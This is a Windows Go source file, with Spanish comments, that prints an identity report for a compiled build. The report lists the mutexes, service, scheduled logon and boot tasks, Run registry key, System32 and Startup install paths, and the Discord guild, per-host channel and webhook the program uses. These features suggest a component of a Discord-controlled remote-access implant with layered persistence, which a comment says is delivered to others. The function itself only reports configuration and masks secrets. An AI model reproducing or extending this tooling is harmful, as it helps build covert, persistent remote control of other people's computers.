//go:build windows

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/local/govoid/internal/config"
)

// IdentityReport describe la copia compilada: qué nombres va a crear en la
// máquina y contra qué guild habla. Lo usa el script de entrega para comprobar
// que el -ldflags llegó antes de mandar el binario a nadie, y sirve de
// referencia cuando hay dos builds en el mismo equipo.
//
// El token y la parte secreta del webhook no salen aquí: el informe puede
// viajar por chat sin filtrar credenciales.
func IdentityReport() string {
	var b strings.Builder

	row := func(label, value string) {
		fmt.Fprintf(&b, "%-12s: %s\n", label, value)
	}

	row("producto", config.ProductID)
	row("nombre", config.AppName)
	row("binario", config.BinaryName)
	row("mutex", config.MutexName)
	row("centinelas", fmt.Sprintf(config.GuardMutexFmt, 0)+" .. "+fmt.Sprintf(config.GuardMutexFmt, 3))
	row("clase", config.WindowClassPrefix)
	row("servicio", config.ServiceName+" ("+config.ServiceDisplayName+")")
	row("tarea", config.ServiceTaskName)
	row("run key", config.RunKeyName)
	row("tareas", config.TaskLogonName+" / "+config.TaskBootName)
	row("datadir", dataDir())
	row("instalado", InstallPath())
	row("system32", systemPath())
	row("startup", startupPath())
	row("guild", config.GuildID)
	row("canal", config.ChannelPrefix+"<hostname>")
	row("categoria", emptyAs(config.CategoryID, "(ninguna)"))
	row("webhook", webhookLabel())

	return b.String()
}

// dataDir es la carpeta machine-wide donde viven la bandera y los centinelas.
func dataDir() string {
	if programData := os.Getenv("ProgramData"); programData != "" {
		return filepath.Join(programData, config.DataDirName)
	}
	return filepath.Join(os.Getenv("APPDATA"), config.DataDirName)
}

// webhookLabel recorta el webhook a su identificador: el resto es la clave.
func webhookLabel() string {
	const marker = "/webhooks/"
	index := strings.Index(config.WebhookURL, marker)
	if index < 0 {
		return "(sin webhook)"
	}
	rest := config.WebhookURL[index+len(marker):]
	if slash := strings.IndexByte(rest, '/'); slash > 0 {
		rest = rest[:slash]
	}
	return "discord.com/api/webhooks/" + rest + "/****"
}

func emptyAs(value, fallback string) string {
	if value == "" {
		return fallback
	}
	return value
}
